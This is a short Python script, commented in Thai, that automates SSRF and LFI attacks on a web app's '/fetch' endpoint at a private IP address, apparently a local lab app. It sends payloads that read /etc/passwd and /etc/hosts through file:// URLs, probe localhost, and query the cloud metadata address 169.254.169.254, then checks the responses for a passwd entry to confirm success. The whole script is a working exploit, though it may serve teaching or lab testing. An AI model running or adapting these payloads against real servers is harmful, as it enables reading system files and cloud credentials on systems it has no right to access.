import requests

# URL ของแอปพลิเคชันที่รันจาก ./start.sh (ตัวอย่าง)
target_url = "http://192.168.109.131:5000/fetch" 

# รายการ Payloads ที่แสดงให้เห็นถึง SSRF และ LFI
payloads = {
    "LFI - Reading /etc/passwd": "file:///etc/passwd",
    "LFI - Reading /etc/hosts": "file:///etc/hosts",
    "SSRF - Accessing Internal Service": "http://localhost:80",
    "SSRF - Metadata Cloud (Simulated)": "http://169.254.169.254/latest/meta-data/"
}

def auto_exploit():
    print("--- Starting Automated SSRF/LFI Demonstration ---")
    
    for description, payload in payloads.items():
        print(f"\n[+] Testing: {description}")
        print(f"    Payload: {payload}")
        
        try:
            # ส่ง URL ผ่านพารามิเตอร์ที่แอปพลิเคชันรับ (ตรวจสอบ name ใน <input> ของ HTML)
            response = requests.get(target_url, params={'url': payload}, timeout=5)
            
            if response.status_code == 200:
                print(f"[Result Preview]:\n{response.text[:300]}...") # แสดงผลลัพธ์บางส่วน
                
                # ตรวจสอบความสำเร็จ (เช่น เจอ root:x:0:0 ในไฟล์ passwd)
                if "root:x:0:0" in response.text:
                    print(">>> SUCCESS: Sensitive system file accessed!")
            else:
                print(f"[!] Server returned status: {response.status_code}")
                
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    auto_exploit()